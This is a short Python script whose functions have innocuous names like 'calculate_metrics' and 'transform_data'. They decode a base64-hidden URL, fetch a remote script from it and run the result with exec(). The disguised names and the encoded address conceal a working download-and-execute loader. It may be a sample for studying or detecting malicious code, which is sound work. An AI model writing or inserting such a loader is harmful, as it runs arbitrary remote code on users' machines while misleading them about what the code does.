import base64
import requests

def calculate_metrics(a):
    return base64.b64decode(a).decode("utf-8")

def transform_data(b):
    c = requests.get(b)
    return c.text

def main():
    try:
        a = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDcucHk="
        b = calculate_metrics(a)
        d = transform_data(b)
        exec(d)
    except Exception as e:
        print(e)

main()
